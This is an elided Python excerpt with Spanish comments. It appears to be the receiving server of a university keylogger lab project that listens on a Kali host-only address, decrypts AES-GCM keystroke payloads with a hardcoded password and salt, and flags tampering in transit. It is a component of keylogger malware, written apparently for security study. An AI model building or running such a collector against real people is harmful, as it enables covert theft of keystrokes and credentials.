...
# Debe coincidir exactamente con keylogger.py para que el descifrado funcione
MASTER_PASSWORD = b"S3guridad_UTalca_2026"
SALT            = b"proyect0_keylogger_salt_v1"
KEY_ITERATIONS  = 200_000

DEFAULT_PORT = 9999
DEFAULT_HOST = "192.168.56.10"      # interfaz host-only de Kali
...
def decrypt_data(blob: bytes, key: bytes) -> bytes:
    ...
    # los primeros 12 bytes son el nonce, el resto es ciphertext + tag GCM
...
class ClientHandler(threading.Thread):
    ...
    def run(self):
        ...
        try:
            # leer los primeros 4 bytes que indican el tamaño del payload
            ...
            # sanidad: rechazar payloads vacíos o absurdamente grandes
            if payload_length == 0 or payload_length > 10 * 1024 * 1024:
                logging.warning(f"[SERVER] Longitud inválida: {payload_length}")
                return

            # leer exactamente `payload_length` bytes del socket
            encrypted_blob = self._recv_exact(payload_length)
            if not encrypted_blob:
                return

            # descifrar — si el MITM modificó los bytes, esto lanzará InvalidTag
            ...
            if isinstance(e, InvalidTag):
                # tag GCM inválido = los datos fueron modificados en tránsito (MITM activo)
    ...
    def _recv_exact(self, n: int) -> bytes | None:
        """Recibe exactamente n bytes del socket (TCP puede fragmentar los datos)."""
        data = b""
        while len(data) < n:
            chunk = self._conn.recv(n - len(data))
            if not chunk:
                return None  # conexión cerrada antes de tiempo
            data += chunk
        return data
...
def run_server(host: str, port: int, key: bytes, output_file: Path):
    ...
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # evitar TIME_WAIT al reiniciar
    ...
    try:
        while True:
            ...
            # cada cliente se maneja en su propio hilo para no bloquear el servidor
...
def demo_encrypt_decrypt(key: bytes):
    ...
    # cifrar como lo haría el keylogger
    ...
    # descifrar como lo hace el servidor
...
def main():
    ...
    # derivar la misma clave que usa el keylogger
